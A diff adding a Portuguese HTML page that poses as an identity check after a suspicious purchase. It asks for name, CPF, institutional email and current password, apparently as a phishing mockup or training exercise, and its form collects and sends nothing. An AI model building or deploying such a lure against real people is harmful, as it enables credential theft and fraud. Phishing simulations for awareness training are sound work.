@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <title>Verificação de Identidade</title>
+    <style>
+        body { font-family: sans-serif; 
+            background: #f4f4f4; 
+            display: flex; 
+            justify-content: center; 
+            padding-top: 50px; }
+        .form-container { background:
+             white; padding: 30px; 
+             border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); 
+             width: 350px; }
+        h3 { color: #d93025; margin-bottom: 20px; }
+        label { display: block; margin-bottom: 5px; 
+            font-weight: bold; font-size: 14px; }
+        input { width: 100%; 
+            padding: 10px; 
+            margin-bottom: 15px; 
+            border: 1px solid #ccc; 
+            border-radius: 4px;
+             box-sizing: border-box; }
+        button { width: 100%; 
+            padding: 12px; 
+            background: #1a73e8; 
+            color: white; 
+            border: none; 
+            border-radius: 4px; 
+            cursor: pointer; 
+            font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <h3>Confirme seus Dados</h3>
+        <p>Preencha os campos abaixo para confirma que voce nao realizou essa compra.</p>
+        <form action="sucesso.html">
+            <label>Nome Completo:</label>
+            <input type="text" placeholder="Nome do usuario" required>
+            
+            <label>CPF:</label>
+            <input type="text" placeholder="000.000.000-00" required>
+            
+            <label>E-mail Institucional:</label>
+            <input type="email" placeholder="usuario@sitedecompras.com.br" required>
+
+            <label>Senha Atual:</label>
+            <input type="password" placeholder="Sua senha atual" required>
+            
+            <button type="submit">Finalizar Verificação</button>
+        </form>
+    </div>
+</body>
+</html>
